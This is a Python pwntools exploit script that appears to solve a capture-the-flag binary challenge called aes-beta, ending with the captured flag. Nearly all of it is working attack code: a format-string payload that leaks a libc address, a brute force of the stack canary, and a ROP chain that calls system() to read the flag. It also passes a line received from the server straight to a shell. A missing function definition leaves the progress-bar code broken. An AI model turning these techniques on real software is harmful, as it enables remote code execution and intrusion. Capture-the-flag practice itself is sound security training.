from pwn import *
import sys

binary_name = "./aes-beta_patched"
exe  = ELF(binary_name, checksec=True)
libc = ELF("libc.so.6", checksec=False)
context.binary = exe

ru  = lambda *x, **y: r.recvuntil(*x, **y)
rl  = lambda *x, **y: r.recvline(*x, **y)
rc  = lambda *x, **y: r.recv(*x, **y)
sla = lambda *x, **y: r.sendlineafter(*x, **y)
sa  = lambda *x, **y: r.sendafter(*x, **y)
sl  = lambda *x, **y: r.sendline(*x, **y)
sn  = lambda *x, **y: r.send(*x, **y)

if args.REMOTE:
	r = connect("aesbeta.challs.olicyber.it", 38310)
elif args.GDB:
	r = gdb.debug(f"debug_dir/{binary_name}", """
		b *encrypt
        set follow-fork-mode child
		c
	""", aslr=False)
else:
	r = process(f"debug_dir/{binary_name}")

if args.REMOTE:
	ru(b"or\n")
	pow = rl()
	print(pow)
	result = subprocess.run(pow, shell=True, capture_output=True, text=True)

	if result.returncode == 0:
		print("Command output:")
		print(result.stdout)
	else:
		print("Command failed with error:")
		print(result.stderr)
	res_pow = result.stdout
	sl(str(res_pow).encode())

def get_message(pid):
	ru(b"> ")
	sl(b"2")
	sl(str(pid).encode())
	line = rl()
	if b"running" in line:
		return get_message(pid)
	status =  int(line.strip().split()[-1])
	ru(b"text:\n")
	text = rl().strip()
	return status, text

def send_message(size , message):
	ru(b"> ")
	sl(b"1")
	sl(str(size).encode())
	sla(b"message:", message)
	ru(b"PID: ")
	pid = int(rl())
	sleep(0.2)
	return pid


	
def decript(key, message):
    result = b''
    for i, char in enumerate(message):
        result += bytes([char ^ key[i % len(key)]]) 
    return result
def encrypt(key, message):
	result = b''
	for i, char in enumerate(message):
		result += bytes([char ^ key[i % len(key)]])
	return result


def findqword():
    canary = b''
    for i in range(8):
        for j in range(0xff):
            msg = b'A' * 72 + canary + bytes([j])
            pid = send_message(len(msg), msg)
            status, _ = get_message(pid)
            if status == 0:
                canary += bytes([j])
                progress(i)
                break
    return canary
#cool function to see the advancement while bruting
    sys.stdout.write('\r')
    sys.stdout.write("[*] Finding canary: [%-8s]" % ('#' * (value + 1)))
    sys.stdout.flush()


#star exploit 

#leak libc and size overwrite
key = b"%9$p%7$n"
sl(key)
sl(b"8")
ru(b"key:\n")
libc_leak = int(rl().strip(),16)

libc.address = libc_leak - 0x29d90
log.success(f"LIBC BASE : {hex(libc.address)}")


#bruting the canary
canary = findqword()
result = decript(key, canary)
canary = u64(result)
log.success(f"CANARY LEAKED: {hex(canary)}")

#ROP CHAIN

rop = ROP(libc)
payload = encrypt(key , b"cat $(find -name flag)".ljust(72, b"\x00"))
payload += p64(canary)
payload += b"A" * 8
payload += p64(rop.find_gadget(['pop rbx', 'ret'])[0])
payload += p64(libc.symbols['system'])
payload += p64(libc.address + 0x0000000000043817) # mov rdi, [rsp + 0x10], ..., call rbx;

encrypt_payload = encrypt(key , payload)
pid = send_message(len(encrypt_payload), encrypt_payload)
print("RCE pid" , pid)

#added w out testing
sl(b"2")
sl(str(pid).encode())

r.interactive()
#TeamItaly{A5ynChR0n0u5_L34ks_Ar3_6O0d_3n0ugh_4_P0w3Rfu1_R0P_Ch41n5_210fc6dc}
